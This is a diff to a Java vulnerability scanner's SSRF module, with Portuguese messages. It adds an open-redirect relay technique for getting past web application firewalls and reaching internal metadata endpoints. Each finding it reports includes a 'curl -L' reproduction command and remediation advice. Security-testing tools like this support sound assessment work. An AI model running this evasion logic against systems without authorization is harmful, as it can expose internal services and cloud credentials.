@@ -207,6 +207,47 @@ public class SsrfModule implements Scanner {
             }
         }
 
+        // Phase 3: open-redirect relay bypass (WAF evasion via controlled intermediary)
+        String relayBase = ctx.config().redirectRelayUrl();
+        if (findings.isEmpty() && !relayBase.isBlank()) {
+            log.accept("[~] SSRF: testando open-redirect relay bypass via " + relayBase);
+            relayOuter : for (String path : activePaths) {
+                for (String param : REDIRECT_PARAMS) {
+                    for (SsrfProbe probe : REDIRECT_PROBES) {
+                        try {
+                            String relayUrl = relayBase + URLEncoder.encode(probe.url(), "UTF-8");
+                            String url = baseUrl + path + "?" + param + "=" + URLEncoder.encode(relayUrl, "UTF-8");
+                            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url))
+                                    .timeout(Duration.ofSeconds(6)).GET().build();
+                            HttpResponse<String> resp = Http.send(ctx, hcFollow, req,
+                                    HttpResponse.BodyHandlers.ofString(), id());
+                            String body = resp.body() != null ? resp.body() : "";
+                            Matcher m = METADATA_PATTERN.matcher(body);
+                            if (resp.statusCode() == 200 && m.find()) {
+                                String match = m.group();
+                                log.accept("[!!] SSRF: via relay bypass — " + probe.label() + " param=" + param
+                                        + " relay=" + relayBase);
+                                findings.add(Finding.of("SSRF", path + "?" + param,
+                                        "SSRF via open-redirect relay bypass — " + probe.label() + " (param: " + param
+                                                + ")",
+                                        probe.severity(),
+                                        "URL: " + url + " | Relay: " + relayBase + " | Indicador: " + match,
+                                        "Servidor segue redirect do relay para " + probe.url()
+                                                + " — WAF bypassado via dominio intermediario controlado pelo atacante",
+                                        "curl -L '" + url + "'",
+                                        "Validar URL final apos resolucao de redirects; bloquear ranges internos mesmo"
+                                                + " via redirect chain; nao confiar apenas no host inicial da URL",
+                                        _cweId, _cweTitle, _cveVector, _score));
+                                break relayOuter;
+                            }
+                        } catch (Exception e) {
+                            // expected
+                        }
+                    }
+                }
+            }
+        }
+
         if (findings.isEmpty()) {
             log.accept("[+] SSRF: nenhum indicador de SSRF detectado");
         }
